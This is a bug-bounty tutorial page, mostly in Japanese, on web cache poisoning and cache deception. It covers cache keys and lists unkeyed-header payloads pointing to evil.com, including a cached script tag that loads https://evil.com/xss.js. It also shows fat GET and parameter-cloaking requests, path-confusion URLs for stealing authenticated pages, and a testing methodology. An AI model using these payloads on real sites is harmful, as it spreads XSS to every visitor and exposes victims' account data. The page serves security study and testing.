Web Cache Poisoning & Deception

CDN/Cacheレイヤーを悪用してXSSやデータ漏洩を全ユーザに拡散する攻撃。 PayPal XSS+Cache Poisoning $18,900が代表的な高額報告。

Theory Hands-on WSA Labs Case Study

Cache Key Fundamentals

CDN/Reverse proxyはリクエストの一部をキャッシュキーとして使用し、 同じキーのリクエストにはキャッシュされたレスポンスを返す。

典型的なCache Key構成要素

Keyed (キャッシュキーに含まれる)Unkeyed (含まれない)
Host headerX-Forwarded-Host
URL pathX-Original-URL
Query string (一部/全部)X-Rewrite-URL
Accept-EncodingX-Forwarded-Scheme
User-Agent (場合による)
Cookie (場合による)
Core Principle

Unkeyedなinputがレスポンスに反映される場合、 攻撃者は悪意あるレスポンスをキャッシュさせ、同じURLにアクセスする全ユーザに配信できる。

Web Cache Poisoning

Attack Flow

Attacker → CDN: GET /page HTTP/1.1 Host: target.com X-Forwarded-Host: evil.com ← Unkeyed header CDN → Origin: Forwards request (including X-Forwarded-Host) Origin → CDN: 200 OK <script src="https://evil.com/xss.js"></script> ↑ Application reflects X-Forwarded-Host in response CDN: Caches response under key = "GET /page target.com" Victim → CDN: GET /page HTTP/1.1 Host: target.com CDN → Victim: 200 OK (CACHED - contains attacker's XSS payload!)

Common Unkeyed Headers

# Host override headers
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com

# URL/Path override
X-Original-URL: /admin
X-Rewrite-URL: /admin

# Scheme/Protocol
X-Forwarded-Scheme: http  (force redirect to http → inject)
X-Forwarded-Proto: http

# Misc
X-Forwarded-Port: 1234
X-Original-Host: evil.com
Forwarded: host=evil.com

Fat GET Requests

# Some servers process body in GET requests
# CDN ignores body (not part of cache key)
GET /api/user HTTP/1.1
Host: target.com
Content-Type: application/x-www-form-urlencoded

role=admin
# If backend processes body → response changes → cached for all

Parameter Cloaking

# Different URL parsers handle parameters differently
# CDN uses first '?' as separator, backend uses ';' as separator

GET /page?cachebuster=1;callback=alert(1)
# CDN cache key: /page?cachebuster=1;callback=alert(1) (unique per test)
# Backend sees: callback=alert(1) → reflected in JSONP → XSS cached!

Web Cache Deception

Concept (逆方向の攻撃)

Cache Poisoningが「悪意あるコンテンツをキャッシュさせる」のに対し、 Cache Deceptionは「victimの認証済みレスポンスをキャッシュさせ、攻撃者が読む」。

Attacker crafts URL: https://target.com/account/settings/nonexist.css ↑ CDN sees .css extension → "this is cacheable static content" ↑ Backend ignores /nonexist.css → returns /account/settings (authenticated) Step 1: Victim clicks link → CDN caches their authenticated response Step 2: Attacker accesses same URL → gets victim's cached account page

Path Confusion Techniques

# Extension-based
/account/settings/x.css
/account/settings/x.js
/account/settings/x.jpg

# Path parameter
/account/settings;x.css

# Encoded separators
/account/settings%2fx.css
/account/settings%23x.css

# Dot segments
/static/../account/settings  (CDN caches as /static/.. , backend normalizes)

Conditions

  • CDNがURL拡張子/パターンでキャッシュ判定 (.css, .js, .jpg, /static/)
  • Backendがパスのtrailingコンポーネントをignoreして同じコンテンツを返す
  • 認証済みレスポンスにCache-Control: no-storeが未設定

CDN-Specific Behaviors

CDN特徴的な動作Attack Surface
Cloudflareデフォルトで静的拡張子のみキャッシュCache Deception via extension
FastlyVCL customization多い、Vary header処理Vary header manipulation
AkamaiQuery string handling rulesParameter-based poisoning
VarnishX-Forwarded-Hostをデフォルトで転送Host header poisoning
AWS CloudFrontHeaders/cookies/query stringの選択転送Forwarded header injection

Cache Key Normalization Issues

# Path normalization difference
CDN key: /page (normalized)
Backend: /PAGE (case-insensitive match)
→ /PAGE and /page share same cache entry on CDN

# Encoding normalization
CDN key: /page%2f (not normalized)
Backend: /page/ (decoded)
→ Different cache entries, same backend response

Tools & Methodology

Param Miner (Burp Extension)

James Kettle作のBurp extension。Unkeyed headerとparameterを自動検出。 Web cache poisoningテストの必須ツール。

  • Guess headers: Unkeyed headerを大量に試行
  • Guess parameters: Unkeyed query parameterを検出
  • Cache buster: テスト時にキャッシュを分離するパラメータ自動付与

Testing Methodology

  1. Cache動作の確認: レスポンスヘッダ (X-Cache, Age, CF-Cache-Status) を確認
  2. Cache buster設定: ?cb=random123 でテスト分離
  3. Unkeyed input探索: Param Minerで自動探索 or 手動header injection
  4. Reflection確認: Unkeyed inputがレスポンスのどこに反映されるか特定
  5. Exploit crafting: 反映箇所に応じたpayload作成 (XSS, redirect等)
  6. Cache buster除去: 本番キャッシュキーでpoison確認
Testing Ethics

Cache poisoningテストはcache busterを必ず使用すること。 本番キャッシュを汚染すると全ユーザに影響がでる。 PoC成功を確認したら即座にキャッシュbustリクエストでクリアすること。

Real-World Reports

PayPal XSS via Cache Poisoning ($18,900)

PayPalのX-Forwarded-Host headerがレスポンスのscript srcに反映される脆弱性を発見。 このunkeyed headerを利用してXSS payloadをCDNにキャッシュさせ、 PayPalにアクセスする全ユーザにXSSを配信可能に。 単体XSS + Cache Poisoningの組み合わせで高額評価。

DoD: Cache Poisoning via X-Original-URL

Department of DefenseのサイトでX-Original-URLヘッダーが バックエンドのルーティングを上書きし、管理画面のコンテンツを 公開URLのキャッシュにpoisonすることに成功。
